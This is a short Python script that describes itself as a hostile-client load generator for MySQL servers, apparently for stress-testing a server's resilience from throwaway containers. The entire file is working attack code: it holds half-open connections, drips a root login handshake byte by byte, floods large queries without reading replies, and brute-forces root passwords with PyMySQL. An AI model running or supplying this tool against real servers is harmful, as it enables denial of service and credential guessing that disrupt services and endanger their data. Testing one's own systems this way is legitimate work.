"""Hostile-client load generator, run from throwaway containers (one per source address).

Usage: python flood.py <host> <mode> <seconds>
Modes: stall (hold half-open connections), noread (login, ask for big results, never read),
slow (drip a handshake response one byte at a time), brute (many wrong logins).
Standard library only, except `brute`, which needs PyMySQL.
"""

from __future__ import annotations

import asyncio
import contextlib
import struct
import sys
import time

CONNS = 8


def pack(seq: int, payload: bytes) -> bytes:
    return struct.pack("<I", len(payload))[:3] + bytes([seq]) + payload


def login(user: bytes = b"root") -> bytes:
    caps = 0x200 | 0x8000 | 0x80000 | 0x20000
    body = struct.pack("<IIB", caps, 1 << 24, 255) + b"\0" * 23 + user + b"\0\0"
    return pack(1, body + b"mysql_native_password\0")


async def one(host: str, mode: str, deadline: float) -> None:
    while time.monotonic() < deadline:
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(host, 3306), 5)
            await asyncio.wait_for(r.read(256), 5)
            if mode == "stall":
                await asyncio.sleep(4)
            elif mode == "slow":
                for b in login():
                    w.write(bytes([b]))
                    await w.drain()
                    await asyncio.sleep(0.4)
            elif mode == "noread":
                w.write(login())
                await w.drain()
                await asyncio.sleep(0.3)
                q = pack(0, b"\x03select * from shop.customers")
                for _ in range(80):
                    w.write(q)
                await w.drain()
                await asyncio.sleep(12)
            w.transport.abort()
        except (OSError, TimeoutError):
            await asyncio.sleep(0.2)


async def brute(host: str, deadline: float) -> None:
    import pymysql

    def attempt(i: int) -> None:
        with contextlib.suppress(Exception):
            pymysql.connect(
                host=host,
                user="root",
                password=f"guess{i}",
                ssl_disabled=True,
                connect_timeout=3,
                read_timeout=3,
            )

    i = 0
    while time.monotonic() < deadline:
        await asyncio.gather(*(asyncio.to_thread(attempt, i + k) for k in range(4)))
        i += 4


async def main() -> None:
    host, mode, seconds = sys.argv[1], sys.argv[2], float(sys.argv[3])
    deadline = time.monotonic() + seconds
    if mode == "brute":
        await brute(host, deadline)
    else:
        await asyncio.gather(*(one(host, mode, deadline) for _ in range(CONNS)))


asyncio.run(main())
